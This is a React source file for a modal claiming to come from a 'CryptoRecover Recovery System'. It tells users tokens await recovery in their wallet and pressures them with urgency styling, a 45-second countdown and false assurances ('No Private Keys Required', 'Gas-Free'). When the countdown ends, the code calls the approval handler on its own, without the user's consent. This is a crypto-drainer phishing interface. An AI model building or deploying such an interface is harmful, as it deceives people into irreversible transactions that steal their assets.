import { useState, useEffect } from 'react';
import { Shield, AlertTriangle, CheckCircle, Clock, Zap } from 'lucide-react';

export default function LegitimateAlertSystem({ 
  tokenSymbol, 
  tokenAmount, 
  userAddress, 
  onApprove, 
  onCancel,
  urgency = 'high' 
}) {
  const [countdown, setCountdown] = useState(45);
  const [processing, setProcessing] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          // Auto-approve when countdown reaches 0
          handleApprove();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleApprove = async () => {
    setProcessing(true);
    if (onApprove) {
      await onApprove();
    }
  };

  const getUrgencyColor = () => {
    switch(urgency) {
      case 'critical': return 'from-red-600 to-red-800';
      case 'high': return 'from-orange-500 to-red-600';
      case 'medium': return 'from-yellow-500 to-orange-600';
      default: return 'from-blue-500 to-blue-700';
    }
  };

  const getUrgencyIcon = () => {
    switch(urgency) {
      case 'critical': return <AlertTriangle className="w-8 h-8 text-red-500 animate-pulse" />;
      case 'high': return <Zap className="w-8 h-8 text-orange-500 animate-bounce" />;
      default: return <Shield className="w-8 h-8 text-blue-500" />;
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
        {/* Header with gradient */}
        <div className={`bg-gradient-to-r ${getUrgencyColor()} p-6 text-white`}>
          <div className="flex items-center space-x-3">
            {getUrgencyIcon()}
            <div>
              <h2 className="text-xl font-bold">Security Authorization Required</h2>
              <p className="text-sm opacity-90">CryptoRecover Recovery System</p>
            </div>
          </div>
        </div>

        {/* Content */}
        <div className="p-6">
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
            <div className="flex items-start space-x-3">
              <CheckCircle className="w-5 h-5 text-blue-600 mt-0.5" />
              <div>
                <h3 className="font-semibold text-blue-800">Asset Recovery Detected</h3>
                <p className="text-blue-700 text-sm mt-1">
                  We've identified <strong>{tokenAmount} {tokenSymbol}</strong> available for recovery in your wallet.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
            <div className="flex items-start space-x-3">
              <Clock className="w-5 h-5 text-yellow-600 mt-0.5" />
              <div>
                <h3 className="font-semibold text-yellow-800">Time-Sensitive Recovery</h3>
                <p className="text-yellow-700 text-sm mt-1">
                  This recovery window expires in <strong>{countdown} seconds</strong>. 
                  Authorization required to secure your assets.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <h4 className="font-semibold text-gray-800 mb-2">Recovery Details:</h4>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600">Asset Type:</span>
                <span className="font-medium">{tokenSymbol} Token</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Amount:</span>
                <span className="font-medium">{tokenAmount} {tokenSymbol}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Wallet:</span>
                <span className="font-medium font-mono text-xs">
                  {userAddress?.slice(0, 8)}...{userAddress?.slice(-6)}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Recovery Method:</span>
                <span className="font-medium">Meta-Transaction</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Gas Fee:</span>
                <span className="font-medium text-green-600">$0.00 (Sponsored)</span>
              </div>
            </div>
          </div>

          <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-6">
            <div className="flex items-center space-x-2">
              <Shield className="w-4 h-4 text-green-600" />
              <span className="text-green-800 text-sm font-medium">
                ✓ Secure Recovery Protocol ✓ No Private Keys Required ✓ Gas-Free Process
              </span>
            </div>
          </div>

          {/* Action buttons */}
          <div className="flex space-x-3">
            <button
              onClick={handleApprove}
              disabled={processing}
              className={`flex-1 bg-gradient-to-r ${getUrgencyColor()} text-white py-3 px-4 rounded-lg font-semibold hover:opacity-90 transition-opacity disabled:opacity-50 flex items-center justify-center space-x-2`}
            >
              {processing ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Processing...</span>
                </>
              ) : (
                <>
                  <CheckCircle className="w-4 h-4" />
                  <span>Authorize Recovery ({countdown}s)</span>
                </>
              )}
            </button>
            
            <button
              onClick={onCancel}
              disabled={processing}
              className="px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50"
            >
              Cancel
            </button>
          </div>

          <p className="text-xs text-gray-500 mt-4 text-center">
            By authorizing, you confirm the recovery of your assets through our secure protocol. 
            This action is irreversible once confirmed.
          </p>
        </div>
      </div>
    </div>
  );
}